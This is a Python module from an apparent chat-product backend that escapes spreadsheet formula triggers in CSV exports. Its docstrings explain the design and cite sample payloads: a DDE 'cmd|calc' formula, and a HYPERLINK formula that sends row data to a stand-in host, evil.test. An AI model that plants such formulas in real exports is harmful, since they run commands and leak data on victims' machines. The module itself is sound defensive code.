"""CSV-injection escaping, shared by every export that emits a downloadable file.

Lives in ``app.core`` rather than next to any one route because the defence had
already been written three times independently (per-bot analytics, the GSTR
return in ``superadmin_routes_v2``, and the lead export), a copy-per-route
defence is one forgotten route away from being a copy-per-route hole. All four
exports now call in here. No FastAPI or ORM imports here, so the worker can use
it too.

Prefer :func:`csv_safe_row` over calling :func:`csv_safe` per cell: routing a
whole row through one funnel is what keeps a column added later safe without
its author having to know this module exists. The GSTR export is the one place
that must not, its money columns are pre-formatted strings, and a negative
figure (``-5.00``) starts with a formula trigger, so the funnel would quote a
tax amount. Where a row mixes untrusted text with formatted numerics, escape
the text cells explicitly and say why.
"""

from collections.abc import Iterable

# Leading characters that make a spreadsheet treat a cell as a formula rather
# than as text. ``=`` and ``@`` start a formula outright; ``+``/``-`` start a
# signed expression; a leading TAB or CR is stripped by Excel before it makes
# that decision, so ``\t=cmd|'/c calc'!A0`` slips a formula past a naive
# first-character check. OWASP's CSV-injection list, in full.
CSV_FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str | None) -> str:
    """Neutralise a spreadsheet formula hiding in an untrusted string.

    Every string in an OyeChats export originates outside the server (a bot
    name the customer typed, a company a website visitor typed into the lead
    form, a UTM parameter lifted off the host page's URL) and lands verbatim
    in a file that a customer (or *their* client) opens in Excel. A value of
    ``=HYPERLINK("https://evil.test/?"&A2,"Click")`` would execute on open and
    exfiltrate the rest of the row from a machine that never touched OyeChats.

    The fix is to stop the cell from ever *starting* with a formula trigger:
    prefix it with a single quote, which every spreadsheet reads as "the rest
    of this cell is literal text". The quote stays visible when a CSV is opened
    directly (unlike a typed cell, where it is consumed as a formatting hint),
    a deliberate trade of cosmetics for not executing attacker input. Quoting
    alone would not do: Excel evaluates ``"=1+1"`` just the same, so RFC-4180
    escaping (which ``csv.writer`` already applies for delimiters, quotes and
    newlines) is a separate concern from this one.

    Server-computed integers (counters, scores, message totals) do not need
    this and should be written through unchanged, so the numeric columns stay
    numeric in the recipient's spreadsheet.

    Known and accepted cost: an E.164 phone number (``+91 98000 00000``) starts
    with ``+``, so it picks up the quote too, which on India's market is most
    rows of a lead export. Exempting values that "look like" a phone number is
    not an option (``+1+1`` looks exactly as numeric as ``+91``) and every
    published bypass of this defence lives in precisely that kind of heuristic.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(CSV_FORMULA_PREFIXES) else text


def csv_safe_row(values: Iterable[object]) -> list[object]:
    """Escape every string in one CSV row; pass everything else through.

    The funnel form of :func:`csv_safe`, and the one exports should use. Wrapping
    each cell individually at the call site works right up until someone appends
    a seventeenth column and doesn't know they had to, at which point that
    column is silently injectable again, and no type checker, linter or existing
    test says a word. Escaping the row as a unit makes the safe thing the
    default and the unsafe thing impossible to reach by omission.

    Numbers are returned untouched rather than stringified: the integers an
    export computes (counters, scores, message totals) must stay integers so the
    recipient's spreadsheet keeps them numeric and sortable. That is also why
    this cannot simply be ``[csv_safe(v) for v in values]``.

    ``None`` is the exception to that passthrough, and goes through
    :func:`csv_safe` to become ``""``, the same answer that function gives it
    alone. The two used to disagree (``csv_safe(None) == ""`` but
    ``csv_safe_row([None]) == [None]``) and were output-identical only because
    ``csv.writer`` happens to render ``None`` as an empty field. That is a
    property of today's consumer, not of this function: the first caller to
    build a row for anything else (an xlsx sheet, a JSON preview, a `join`)
    would get a literal ``"None"`` in a cell, from a helper whose whole purpose
    is that callers do not have to think about cells. Unlike an integer, a
    ``None`` has no numeric meaning worth preserving in a spreadsheet.
    """
    return [csv_safe(value) if isinstance(value, str) or value is None else value for value in values]
